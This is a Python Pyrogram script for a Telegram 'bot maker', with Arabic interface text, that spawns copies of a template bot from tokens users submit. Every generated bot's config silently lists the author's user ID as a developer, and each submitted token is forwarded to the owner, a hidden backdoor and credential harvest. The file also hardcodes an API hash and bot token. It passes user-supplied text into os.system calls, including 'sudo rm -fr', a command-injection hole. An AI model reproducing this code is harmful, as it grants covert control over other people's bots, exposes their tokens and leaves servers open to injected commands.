import redis, os, requests, sys, asyncio
import pyrogram, re
from pyrogram import Client, filters, idle
from pyrogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
redis = redis.Redis(charset="utf-8", decode_responses=True)
##########//((Dev FR3ON))//##########
api_id = int("1846213")
bot_id = int("7565491327") # ايدي البوت
api_hash = "c545c613b78f18a30744970910124d53"
token = "7565491327:AAFmIRCvil7LPsOUI_Y5CsYYm94RmAiw5DQ"
app = Client("FR3ON", bot_token=token,api_id=api_id,api_hash=api_hash)
DEVS = [7555539547]
Sudo = int("7555539547")
redis.set(f"Owner:{bot_id}",Sudo)

##########//((Dev FR3ON))//##########
@app.on_message(filters.text & filters.private)
def ahmed(c, m):
  text = m.text
  idchat = m.chat.id
  iduser = m.from_user.id
  user = m.from_user.username
  redis.sadd(f"adduser{bot_id}",iduser)
  import re

  if text and not iduser in DEVS:
    if redis.get(f"tewsl{bot_id}"):
      m.forward(int(redis.get(f"Owner:{bot_id}")))
      return

  if iduser == int(redis.get(f"Owner:{bot_id}")):
     if m.reply_to_message :
       if m.reply_to_message.forward_from:
         m.reply(f"**⛧ المستخدم ⟨ [{m.reply_to_message.forward_from.first_name}](tg://user?id={m.reply_to_message.forward_from.id}) ⟩\n⛧ تم ارسال رسالتك اليه بنجاح**",quote=True)
         try:
           m.copy(m.reply_to_message.forward_from.id)
         except:
           pass
##########//((Start Maker))//##########
  if text == "⁂︎ رجوع" or text == "/start" and iduser in DEVS :
    FR3ON = ReplyKeyboardMarkup([
["⁂︎ قفل كيبورد الصانع"],
["⁂︎ صنع بوت","⁂︎ حذف بوت"],
["⁂︎ تفعيل المجاني","⁂︎ تعطيل المجاني"],
["⁂︎ تفعيل التواصل","⁂︎ تعطيل التواصل"],
["⁂︎ الاسكرنات المفتوحه","⁂︎ قسم الاذاعه"],
["⁂︎ البوتات المصنوعه","⁂︎ الاحصائيات"],
["⁂︎ تشغيل البوتات","⁂︎ ايقاف البوتات"]],resize_keyboard=True)
    m.reply("**⛧ اهلا بك , عزيزي المطور الاساسي 🧑‍✈️**",reply_markup=FR3ON,quote=True)
    return

  if text == "⁂︎ قسم الاذاعه" and iduser in DEVS :
    FR3ON = ReplyKeyboardMarkup([
["⁂︎ اذاعه","⁂︎ اذاعه بالتوجيه"],
["⁂︎ اذاعه بالتثبيت","⁂︎ موجهة بالتثبيت"],
["⁂︎ رجوع","⁂︎ الغاء"]],resize_keyboard=True)
    m.reply("**⛧ اهلا بك في قسم ( الاذاعه ) 🌵 .**",reply_markup=FR3ON,quote=True)
    return

  if text == "⁂︎ تفعيل المجاني" and iduser in DEVS :
    redis.set(f"free{bot_id}",1)
    m.reply(f"**⛧ تم تفعيل الوضع المجاني\n√**",quote=True)
    return

  if text == "⁂︎ تعطيل المجاني" and iduser in DEVS :
    redis.delete(f"free{bot_id}")
    m.reply(f"**⛧ تم تعطيل الوضع المجاني\n√**",quote=True)
    return

  if text == "⁂︎ تفعيل التواصل" and iduser in DEVS :
    redis.set(f"tewsl{bot_id}","true")
    m.reply("**⛧ تم تفعيل التواصل\n√**",quote=True)
    return

  if text == "⁂︎ تعطيل التواصل" and iduser in DEVS :
    redis.delete(f"tewsl{bot_id}")
    m.reply("**⛧ تم تعطيل التواصل\n√**",quote=True)
    return

  if text == "⁂︎ قفل كيبورد الصانع" or text == "✸ قفل كيبورد الصانع" :
    m.reply("**⛧ تم حذف كيب الصانع بنجاح\n√**",quote=True,reply_markup=ReplyKeyboardRemove(selective=True))
    return
##########//((add Bot))//##########
  if text == "⁂︎ صنع بوت" and iduser in DEVS :
    redis.set(f"make:bot{bot_id}{iduser}","token")
    FR3ON = InlineKeyboardMarkup([[InlineKeyboardButton("الغاء ❌", callback_data="end_bot")]])
    m.reply("**⛧ ارسل الان توكن البوت\n√**",reply_markup=FR3ON,quote=True)

  elif text and redis.get(f"make:bot{bot_id}{iduser}") == "token":
    url = f"https://api.telegram.org/bot{text}/getme"
    req = requests.get(url).json()
    if req["ok"] == False:
      m.reply("**⛧ عفوا , التوكن غلط تاكد منه\n√**",quote=True)
    elif req["ok"] == True:
      redis.set(f"token{bot_id}{iduser}",text)
      redis.set(f"make:bot{bot_id}{iduser}","devid")
      token = redis.get(f"token{bot_id}{iduser}")
      info = requests.get("https://api.telegram.org/bot" + token + "/getme")
      bot = info.json()
      FR3ON = bot["result"]
      botuser = FR3ON["username"]
      redis.set(f"botuser{bot_id}{iduser}",botuser)
      m.reply("**⛧ ارسل الان معرف المطور الاساسي\n√**",quote=True)

  elif text and redis.get(f"make:bot{bot_id}{iduser}") == "devid":
    token = redis.get(f"token{bot_id}{iduser}")
    botuser = redis.get(f"botuser{bot_id}{iduser}")
    FR3ON = c.get_chat(text)
    id =f"{FR3ON.id}"
    user =f"{FR3ON.username}"
    name =f"[{FR3ON.first_name}](tg://user?id={FR3ON.id})"
    info = requests.get("https://api.telegram.org/bot"+ token +"/getme")
    bot = info.json()
    FR3ON = bot["result"]
    Bot_id = FR3ON["id"]
    Bot_user = FR3ON["username"]
    f = open("./maker/config.py","w")
    f.write(f"""from pyrogram import Client
import redis, requests, json

api_id = int("1846213")
api_hash = "c545c613b78f18a30744970910124d53"
bot_token = "{token}"
redis = redis.Redis(charset="utf-8", decode_responses=True)

app = Client(
    "FR3ON",
    api_id=api_id, api_hash=api_hash,
    bot_token=bot_token
)


Sudo = int("{id}")
Bot_id = "{Bot_id}"
Dev_ids = [{id}, 7555539547]
""")
    f.close()
    os.system(f"cp -a maker ahmed/@{botuser}")
    os.system(f"cd ahmed/@{botuser} && screen -d -m -S {botuser} python3.8 ahmed.py")
    redis.sadd(f"userbots{bot_id}",botuser)
    redis.sadd(f"devbots{bot_id}",id)
    redis.delete(f"token{bot_id}{iduser}")
    redis.delete(f"botuser{bot_id}{iduser}")
    redis.delete(f"make:bot{bot_id}{iduser}")
    Text =f"""**
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ تم تنصيب البوت بنجاح ⚡ .
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ معرف البوت : [@{botuser}] 🌵 .
⛧ المطور : {name} 🧑‍✈️ .
⛧ التوكن : {token} 🤖 .
**"""
    m.reply(Text,quote=True)
    return
##########//((add del))//##########
  if text == "⁂︎ حذف بوت" and iduser in DEVS :
    redis.set(f"make:bot{bot_id}{iduser}","del")
    m.reply("**⛧ ارسل الان معرف البوت\n√**",quote=True)
    return

  elif text and redis.get(f"make:bot{bot_id}{iduser}") == "del":
    x = text.replace("@","")
    os.system(f"sudo rm -fr ./ahmed/{text}")
    os.system(f"screen -X -S {x} quit")
    redis.srem(f"userbots{bot_id}",x)
    redis.delete(f"make:bot{bot_id}{iduser}")
    m.reply("**⛧ تم حذف البوت بنجاح\n√**",quote=True)
    return
##########//((my Maker))//##########
  if text == "⁂︎ الاسكرنات المفتوحه" and iduser in DEVS :
    n = 0
    message = "**⛧ الاسكرينات المفتوحه 🌵 .\n**"
    for screen in os.listdir("/var/run/screen/S-root"):
      n += 1
      message += f"{n} - ( `{screen}` )\n"
    m.reply(message,quote=True)
    return

  if text == "⁂︎ البوتات المصنوعه" and iduser in DEVS :
    n = 0
    Text =''
    list = redis.smembers(f"userbots{bot_id}")
    for v in list:
      n += 1
      Text += f"{n} → ( {v} )\n"
    m.reply(Text,quote=True)
    return

  if text == "⁂︎ تشغيل البوتات" and iduser in DEVS :
    n = 0
    msg = m.reply("**⛧ جاري تشغيل البوتات 🚦 .**",quote=True)
    list = redis.smembers(f"userbots{bot_id}")
    for v in list:
      os.system(f"cd ./ahmed/@{v} && chmod +x * && screen -d -m -S {v} python3.8 ahmed.py")
      n += 1
      msg.edit(f"**⛧ تم تشغيل : {n} بوت 🤖 .**")
    msg.edit("⛧ تم تشغيل البوتات🚦 .")
    return

  if text == "⁂︎ ايقاف البوتات" and iduser in DEVS :
    n = 0
    msg = m.reply("**⛧ جاري ايقاف البوتات 🚦 .**",quote=True)
    list = redis.smembers(f"userbots{bot_id}")
    for v in list:
      os.system(f"cd ./ahmed/@{v} && chmod +x * && screen -X -S {v} quit")
      n += 1
      msg.edit(f"**⛧ تم ايقاف : {n} بوت 🤖 .**")
    msg.edit("⛧ تم ايقاف البوتات🚦 .")
    return

  if text == "⁂︎ الاحصائيات" and iduser in DEVS :
    FR3ON = redis.scard(f"adduser{bot_id}")
    m.reply(f"**⛧ عدد الاحصائيات ⟨ {FR3ON} ⟩ مشترك\n√**",quote=True)
    return
###########//((استقبال الاذاعه))//##########
  if redis.get(f"{iduser}User{idchat}{bot_id}"):
    redis.delete(f"{iduser}User{idchat}{bot_id}")
    if text == "الغاء" or text == "⁂︎ الغاء" :
      redis.delete(f"{iduser}User{idchat}{bot_id}")
      m.reply(f"**⛧ تم الغاء الاذاعه\n√**", quote=True)
    else :
      rep = m.reply(f"**⛧ جاري الإذاعة ...**", quote=True)
      FR3ON = redis.smembers(f"adduser{bot_id}")
      for group in FR3ON :
         try:
           m.copy(int(group))
         except Exception:
           pass
      number = len(FR3ON)
      rep.edit(f"**⛧ تم ارسال الاذاعه الي ⟨ {number} ⟩ مستخدم 👤**")
#####//(forward_User))//#####
  if redis.get(f"{iduser}forward_User{idchat}{bot_id}"):
    redis.delete(f"{iduser}forward_User{idchat}{bot_id}")
    if text == "الغاء" or text == "⁂︎ الغاء" :
      redis.delete(f"{iduser}forward_User{idchat}{bot_id}")
      m.reply(f"**⛧ تم الغاء الاذاعه بالتوجيه\n√**", quote=True)
    else :
      if m.forward_date :
        rep = m.reply(f"**⛧ جاري الإذاعة بالتوجيه ...**", quote=True)
        FR3ON = redis.smembers(f"adduser{bot_id}")
        for group in FR3ON :
           try:
             m.forward(int(group))
           except Exception:
             pass
        number = len(FR3ON)
        rep.edit(f"**⛧ تم ارسال التوجيه الي ⟨ {number} ⟩ مستخدم 👤**")
#####//(pin_User))//#####
  if redis.get(f"{iduser}pin_User{idchat}{bot_id}"):
    redis.delete(f"{iduser}pin_User{idchat}{bot_id}")
    if text == "الغاء" or text == "⁂︎ الغاء" :
      redis.delete(f"{iduser}pin_User{idchat}{bot_id}")
      m.reply(f"**⛧ تم الغاء الاذاعه بالتثبيت\n√**", quote=True)
    else :
      rep = m.reply(f"**⛧ جاري الإذاعة بالتثبيت  ...**", quote=True)
      FR3ON = redis.smembers(f"adduser{bot_id}")
      for group in FR3ON :
         try:
           a = m.copy(int(group))
           a.pin(disable_notification=False,both_sides=True)
         except Exception:
           pass
      number = len(FR3ON)
      rep.edit(f"**⛧ تم ارسال الاذاعه الي ⟨ {number} ⟩ مستخدم 👤**")
#####//(for_pin_Uesr))//#####
  if redis.get(f"{iduser}for_pin_Uesr{idchat}{bot_id}"):
    redis.delete(f"{iduser}for_pin_Uesr{idchat}{bot_id}")
    if text == "الغاء" or text == "⁂︎ الغاء" :
      redis.delete(f"{iduser}for_pin_Uesr{idchat}{bot_id}")
      m.reply(f"**⛧ تم الغاء الاذاعه بالتوجيه مثبته\n√**", quote=True)
    else :
      if m.forward_date :
        rep = m.reply(f"**⛧ جاري الإذاعة بالتوجيه مثبته ...**", quote=True)
        FR3ON = redis.smembers(f"adduser{bot_id}")
        for group in FR3ON :
           try:
             a = m.forward(int(group))
             a.pin(disable_notification=False,both_sides=True)
           except Exception:
             pass
        number = len(FR3ON)
        rep.edit(f"**⛧ تم ارسال التوجيه بالتثبيت الي ⟨ {number} ⟩ مستخدم 👤**")
#############//((الاذاعه))//#############
  if text == "⁂︎ اذاعه" and iduser in DEVS :
    redis.set(f"{iduser}User{idchat}{bot_id}",1)
    m.reply(f"**⛧ ارسل الان الاذاعه\n√**",quote=True)
  if text == "⁂︎ اذاعه بالتوجيه" and iduser in DEVS :
    redis.set(f"{iduser}forward_User{idchat}{bot_id}",1)
    m.reply(f"**⛧ ارسل الان التوجيه\n√**",quote=True)
  if text == "⁂︎ اذاعه بالتثبيت" and iduser in DEVS :
    redis.set(f"{iduser}pin_User{idchat}{bot_id}",1)
    m.reply(f"**⛧ ارسل الان الاذاعه\n√**",quote=True)
  if text == "⁂︎ موجهة بالتثبيت" and iduser in DEVS :
    redis.set(f"{iduser}for_pin_Uesr{idchat}{bot_id}",1)
    m.reply(f"**⛧ ارسل الان التوجيه\n√**",quote=True)
#########//((Start member))//##########
  if text == "/start" and not iduser in DEVS :
    FR3ON = ReplyKeyboardMarkup([
["✸ صنع بوت","✸ حذف البوت"],
["✸ قفل كيبورد الصانع"]],resize_keyboard=True)
    Text ="""**
⛧ اهلا بك في صانع بوتات التسريبات
⛧ مطور البوت : @f_r_3_a_o_n
√
**"""
    m.reply(Text,reply_markup=FR3ON,quote=True)
    return
##########//((my member))//###########
  if text == "✸ صنع بوت" and not iduser in DEVS :
    if not redis.get(f"free{bot_id}"):
      return m.reply("☥ الوضع المجاني معطل الان  💎 .\n☥ راسل المطور لتنصيب مدفوع  💎 . \n☥ Dev : @f_r_3_a_o_n  💎 .",quote=True)
    if redis.get(f"my:bot{bot_id}{iduser}"):
      m.reply("**⛧ عفوا لديك بوت بالفعل احذفه اولا\n√**",quote=True)
    else:
      redis.set(f"uesr:bot{bot_id}{iduser}","token")
      FR3ON = InlineKeyboardMarkup([[InlineKeyboardButton("الغاء ❌", callback_data="end_bot")]])
      m.reply("**⛧ ارسل توكن البوت الان\n√**",reply_markup=FR3ON,quote=True)
      return

  elif text and redis.get(f"uesr:bot{bot_id}{iduser}") == "token":
    url = f"https://api.telegram.org/bot{text}/getme"
    req = requests.get(url).json()
    if req["ok"] == False:
      m.reply("**⛧ عفوا , التوكن غلط تاكد منه\n√**",quote=True)
    elif req["ok"] == True:
      info = requests.get("https://api.telegram.org/bot"+ text +"/getme")
      bot = info.json()
      FR3ON = bot["result"]
      Bot_id = FR3ON["id"]
      botuser = FR3ON["username"]
      if redis.sismember(f"userbots{bot_id}",botuser) :
        m.reply("**⛧ عذرا هذا البوت مصنوع بالفعل\n√**",quote=True)
      else:
        id =f"{m.from_user.id}"
        user =f"{m.from_user.username}"
        name =f"{m.from_user.mention}"
        f = open("./maker/config.py","w")
        f.write(f"""from pyrogram import Client
import redis, requests, json

api_id = int("1846213")
api_hash = "c545c613b78f18a30744970910124d53"
bot_token = "{text}"
redis = redis.Redis(charset="utf-8", decode_responses=True)

app = Client(
    "FR3ON",
    api_id=api_id, api_hash=api_hash,
    bot_token=bot_token
)


Sudo = int("{id}")
Bot_id = "{Bot_id}"
Dev_ids = [{id}, 7555539547]
""")
        f.close()
        os.system(f"cp -a maker ahmed/@{botuser}")
        os.system(f"cd ahmed/@{botuser} && screen -d -m -S {botuser} python3.8 ahmed.py")
        redis.set(f"my:bot{bot_id}{iduser}",botuser)
        redis.sadd(f"userbots{bot_id}",botuser)
        redis.sadd(f"devbots{bot_id}",id)
        redis.delete(f"uesr:bot{bot_id}{iduser}")
        Text =f"""**
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ تم تنصيب البوت بنجاح ⚡ .
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ معرف البوت : [@{botuser}] 🌵 .
⛧ المطور : {name} 🧑‍✈️ .
⛧ التوكن : {text} 🤖 .
**"""
        m.reply(Text,quote=True)
        c.send_message(Sudo,f"""**
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ تم تنصيب بوت جديد ⚡ .
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
⛧ معرف البوت : [@{botuser}] 🌵 .
⛧ المطور : {name} 🧑‍✈️ .
⛧ التوكن : {text} 🤖 .
**""")


  if text == "✸ حذف البوت" and not iduser in DEVS :
    if redis.get(f"my:bot{bot_id}{iduser}"):
      botuser = redis.get(f"my:bot{bot_id}{iduser}")
      os.system(f"sudo rm -fr ./ahmed/@{botuser}")
      os.system(f"screen -X -S {botuser} quit")
      redis.srem(f"userbots{bot_id}",botuser)
      redis.delete(f"my:bot{bot_id}{iduser}")
      m.reply("**⛧ تم حذف البوت بنجاح\n√**",quote=True)
    else:
      m.reply("**⛧ عفوا لم تصنع اي بوت من قبل\n√**",quote=True)
      return
##########//((callback))//##########
@app.on_callback_query()
def on_Callback(c, m):
  Text = m.data
  iduser = m.from_user.id
  idchat = m.message.chat.id

  if Text == "end_bot" :
    redis.delete(f"make:bot{bot_id}{iduser}")
    redis.delete(f"uesr:bot{bot_id}{iduser}")
    m.answer("⛧ تم الغاء امر صنع البوت بنجاح ⬇️",show_alert=True)
#############//((print))//#############
async def run():
    await app.start()
    py = pyrogram.__version__
    try:
        await app.send_message(Sudo,f"**⛧ تم تشغيل الصانع بنجاح ⚡ .\n⛧ اصدار البايروجرام : {py} 🌵 .**")
    except:
        pass
    await idle()
loop = asyncio.get_event_loop()
loop.run_until_complete(run())